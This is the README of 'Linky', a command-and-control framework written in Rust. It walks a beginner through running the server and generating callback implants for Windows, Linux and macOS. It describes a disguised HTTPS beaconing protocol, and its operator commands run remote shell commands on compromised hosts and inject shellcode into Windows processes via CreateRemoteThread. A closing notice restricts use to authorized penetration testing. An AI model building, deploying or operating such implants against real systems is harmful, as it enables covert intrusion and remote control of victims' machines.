# Linky C2 Framework

**TL;DR - Quick Setup with Podman (3 Steps)** 🐳🚀

```bash
# 1. Build the container image
podman build -t linky-c2 .

# 2. Run the server (port 8443, implants volume)
#    The Linky CLI starts automatically in this terminal.
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants \
  --name linky-server \
  linky-c2

# 3. Generate a Linux implant (replace IP with your server)
#    You are already at the Linky CLI prompt after step 2.
linky> generate-linux 192.168.1.10:8443
```

**That's it!** Your implant will be in `./implants/link-linux`

💡 **No Rust installation needed!** Everything runs in containers.

For full documentation (native install, development mode, etc.), continue reading below...

---

## Architecture

Cargo workspace with 4 crates:

```
linky/
├── Cargo.toml              # Workspace root (resolver = "2")
├── server/                 # Server binary: linky
│   └── src/
│       ├── main.rs         # Entry point: server thread + GC thread + CLI thread
│       ├── server.rs       # actix-web 4 + rustls 0.23 (self-signed TLS via rcgen)
│       ├── routes.rs       # HTTP handlers: 3-stage C2 protocol
│       ├── links.rs        # Link registry and state management
│       ├── tasks.rs        # Per-link task queue
│       ├── cli.rs          # Interactive CLI (rustyline)
│       └── generate.rs     # Implant builder (invokes cargo)
└── links/
    ├── windows/            # Windows implant  → link-windows.exe
    ├── linux/              # Linux implant    → link-linux
    └── osx/                # macOS implant    → link-osx
```

### C2 Protocol (3 stages)

All communication is HTTPS/JSON. Every request is validated against:
- Fixed User-Agent (IE 11)
- `banner=banner` cookie (set in stage 1)
- Rolling `x-request-id` UUID header (rotated on every poll)

```
Implant                           Server
  │                                  │
  │── GET /js ───────────────────────▶│  Stage 1: Set-Cookie: banner=banner
  │                                  │
  │── POST /static/register ─────────▶│  Stage 2: registration + initial x_request_id
  │◀─ { x_request_id } ──────────────│
  │                                  │
  │── POST /static/get ──────────────▶│  Stage 3: polling loop (every 5 s)
  │   header: x-request-id           │    → server returns next pending task
  │   body: { q, tasking }           │    ← implant submits previous task output
  │◀─ { q, tasking, x_request_id } ──│
  │         (loop)                   │
```

---

## Quick Start (Step-by-Step for Beginners)

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/linky.git
cd linky
```

### 2. Install Prerequisites

#### For Server Only (No Implant Generation):
- [Install Rust](https://www.rust-lang.org/tools/install) (version 1.70+)
- No other dependencies needed!

#### For Full Functionality (Server + Implant Generation):

**On Debian/Ubuntu:**
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Install cross-compilation tools
sudo apt-get update
sudo apt-get install -y \
    musl-tools \
    mingw-w64 \
    clang \
    lld \
    pkg-config \
    libssl-dev

# Add cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-musl
```

**On Fedora/RHEL:**
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env

# Install cross-compilation tools
sudo dnf install -y \
    musl-gcc \
    mingw64-gcc \
    clang \
    lld \
    pkg-config \
    openssl-devel

# Add cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-musl
```

### 3. Build and Run the Server

```bash
# Build the server (release mode for better performance)
cargo build --release -p linky

# Run on port 8443 (no root required)
./target/release/linky 0.0.0.0:8443
```

The server will:
- Generate a self-signed TLS certificate automatically
- Start listening on https://0.0.0.0:8443
- Show an interactive CLI prompt

### 4. Generate Your First Implant

In the Linky CLI:

```
linky> help

  links                    Manage active links
  generate <ip:port>       Build Windows implant
  generate-linux <ip:port> Build Linux implant
  generate-osx <ip:port>   Build macOS implant
  help                     Show this help
  exit / kill              Quit linky

# Generate a Linux implant (replace with your server IP)
linky> generate-linux 192.168.1.10:8443
[*] Building link-linux for 192.168.1.10:8443...
[+] Implant written to ./link-linux
```

Your implant is now ready in the `link-linux` file!

### 5. Using Docker/Podman (Alternative to Native Installation)

If you prefer containerization:

```bash
# Build the image (production mode - no implants)
podman build -t linky-c2 .

# Run the container — the Linky CLI starts automatically.
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants \
  --name linky-server \
  linky-c2

# Generate implants from the CLI prompt (already open after the command above)
linky> generate-linux 192.168.1.10:8443
```

Implants will be available in the `./implants` directory on your host.

### Interactive CLI

```
linky> help

  links                    Manage active links
  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)
  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)
  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)
  help                     Show this help
  exit / kill              Quit linky
```

#### Generating an Implant

```
linky> generate-linux 192.168.1.10:443
[*] Building link-linux (x86_64-unknown-linux-musl) for 192.168.1.10:443 …
[+] Implant written to ./link-linux
```

The callback address is baked into the binary at compile time via `build.rs` (`cargo:rustc-env=CALLBACK=…`).

#### Interacting with a Link

```
linky> links
  -i <name>   Interact with a link
  -k <name>   Send kill task + mark as exited
  -a          Show all links (including inactive)

links> -i link-1

link-1> whoami
link-1> shell uname -a
link-1> ls /etc
link-1> cd /tmp
link-1> pwd
link-1> pid
link-1> info
link-1> back
```

Windows-only commands:
```
link-1> cmd ipconfig /all
link-1> powershell Get-Process
link-1> integrity
link-1> inject <pid> <shellcode_base64>
```

---

## Implants

### Common (Windows / Linux / macOS)

| Feature             | Detail                                                         |
|---------------------|----------------------------------------------------------------|
| Transport           | HTTPS + JSON (reqwest 0.13 blocking, rustls-tls)               |
| TLS                 | Self-signed certs accepted (`danger_accept_invalid_certs`)     |
| Callback address    | Statically compiled via `build.rs`                             |
| Poll interval       | 5 seconds                                                      |
| Reconnection        | Infinite retry loop if the server is unreachable               |

### Linux / macOS

- Shell execution via `/bin/sh -c`
- `hostname`: reads `/etc/hostname` (Linux) or `scutil --get ComputerName` (macOS)
- `platform`: reads `/etc/os-release` (Linux) or `sw_vers` (macOS)

### Windows

- Shell execution via `cmd.exe /C` with `CREATE_NO_WINDOW` flag
- Shellcode injection: `VirtualAllocEx` → `WriteProcessMemory` → `VirtualProtectEx(PAGE_EXECUTE_READ)` → `CreateRemoteThread`
- Integrity level: `GetTokenInformation(TokenIntegrityLevel)` → Untrusted / Low / Medium / High / System

---

## Cross-compilation

The server invokes `cargo build --release --target <triple>` inside each implant crate directory.

| Platform | Triple                      | Required toolchain     |
|----------|-----------------------------|------------------------|
| Windows  | `x86_64-pc-windows-gnu`     | `mingw-w64`            |
| Linux    | `x86_64-unknown-linux-musl` | `musl-cross`           |
| macOS    | `x86_64-apple-darwin`       | `osxcross`             |

```bash
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-musl
rustup target add x86_64-apple-darwin
```

---

## Docker/Podman Containerization

### Build the image

```bash
# Production build (no implants, smaller image)
podman build -t linky-c2 .

# Development build (includes implants for testing)
podman build --build-arg DEV_MODE=true -t linky-c2 .
```

### Run the container

```bash
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants \
  --name linky-server \
  linky-c2
```

### Usage

The server starts automatically on port 8443 with a self-signed certificate.

#### Generate implants

**Production mode:** Implants are NOT pre-built in the container. You need to generate them using the CLI or mount your own implants to `/implants`.

**Development mode:** If you built with `DEV_MODE=true`, implants are available in the `/implants` directory (mounted to `./implants` on host).

Available implants (DEV_MODE only):
- `link-windows.exe` - Windows implant
- `link-linux` - Linux implant

To generate implants in production mode, the CLI is accessible directly from
the interactive terminal opened by `podman run -it`. To re-attach to a running
container started in a separate session:
```bash
# Re-attach to the CLI of a running container
podman attach linky-server

# Then use the generate commands
linky> generate 192.168.1.10:8443
linky> generate-linux 192.168.1.10:8443
```

### Development

#### Rebuild after changes

```bash
podman build --no-cache -t linky-c2 .
```

#### Shell into container

```bash
podman run -it --rm \
  -p 8443:8443 \
  -v ./implants:/implants \
  --entrypoint /bin/bash \
  linky-c2
```

### Notes

- Uses port 8443 to avoid privileged port requirements
- Self-signed TLS certificate is generated automatically
- **Production mode**: No implants included (smaller image, generate via CLI)
- **Development mode**: Implants included when built with `DEV_MODE=true`
- macOS support requires additional osxcross setup (not included)
- To generate implants in production: use the CLI `generate` commands or mount your own implants to `/implants`

---

## Known Issues / TODO

- **No prerequisite checks** — Before invoking `cargo build`, the generate commands should verify that the required `rustup target` and C toolchain (e.g. `x86_64-linux-musl-gcc`, `mingw64`, `osxcross`) are present, and print actionable install instructions if not.
- **CLI navigation confusion** — Top-level commands (e.g. `generate`, `help`) entered inside the `links>` submenu return "Unknown" with no guidance.
- **osxcross setup** — macOS cross-compilation requires osxcross; setup steps are not documented.

---

## Security Notice

This tool is designed for use in **authorized** penetration testing engagements only. Do not use it against systems without explicit written permission from the owner.

## Disclaimer

This project is provided for educational and offensive security research purposes. The authors accept no responsibility for unauthorized or illegal use.